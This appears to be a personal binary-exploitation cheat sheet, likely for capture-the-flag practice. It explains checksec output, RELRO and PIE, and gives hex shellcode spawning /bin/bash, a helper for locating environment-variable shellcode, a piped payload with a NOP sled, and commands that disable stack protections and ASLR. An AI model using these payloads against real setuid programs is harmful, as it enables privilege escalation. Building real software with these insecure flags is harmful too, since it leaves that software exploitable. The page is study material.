# Various

## Checksec

Check executables and kernel properties

```
checksec --file=ch37.bin
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols        No    0               4               ch37.bin

```

### RELRO:

Relocation Read-Only

Partial RELRO: \
\- Default setting in GCC\
\- Only forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflow on a global variable overwriting GOT entries



Full RELRO:\
\- Makes GOT completely read-only.\
\- Longer load time of binary



### PIE:

Position Independent Executable\
\- PIE binary and all of its dependencies are loaded into randomized locations within virtual memory.\
\- Protect against ROP attacks\
\- GDB disabled address randomization by default. Will relocate to 0x555555550000.



Linux System Call Table: [https://faculty.nps.edu/cseagle/assembly/sys\_call.html](https://faculty.nps.edu/cseagle/assembly/sys_call.html)



Create Core dumps after crash:

```
ulimit -c unlimited
cat /proc/sys/kernel/core_pattern # Location and naming
gdb app123 core
```



### Shellcodes

{% embed url="https://shell-storm.org/shellcode/index.html" %}

|                                                                          |                                                                                                                          |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------ |
| setreuid(getuid(), getuid()) & execve("/bin/sh") / (for setuid binaries) | [https://shell-storm.org/shellcode/files/shellcode-597.html](https://shell-storm.org/shellcode/files/shellcode-597.html) |
|                                                                          |                                                                                                                          |
|                                                                          |                                                                                                                          |

Store shellcode in environment variable:

{% code overflow="wrap" %}
```bash
export shellcode=`python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f \x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")'`
```
{% endcode %}

Retrieve offset for environment variables:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char**argv){
	char *ptr;
	if(argc<3){
		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]);
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2;  
	printf("%s will be at %p\n", argv[1], ptr);
}
```

Run shell code for applications with interactive CLI:

{% code overflow="wrap" %}
```sh
(python2 -c 'print "\x35\x0a\x32\x0a\x29\xcf\xff\xff\x35\xcf\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"' ; cat) | ./application
```
{% endcode %}

Compile code without security features

```bash
gcc -z execstack -fno-stack-protector -no-pie -fno-pie -o myprogram myprogram.c
```

| Command parameter    |                                                                                                                                         |   |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | - |
| -no-pie -fno-pie     | Disables Position Independent Executable (PIE) to prevent address randomization of the executable, making it run at a fixed address.    |   |
| -fno-stack-protector | Turns off the generation of stack canaries, which are used to detect and prevent stack buffer overflow attacks.                         |   |
| -z execstack         | Marks the stack as executable, allowing code execution from the stack, which is typically blocked to prevent certain types of exploits. |   |

Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize\_va\_space
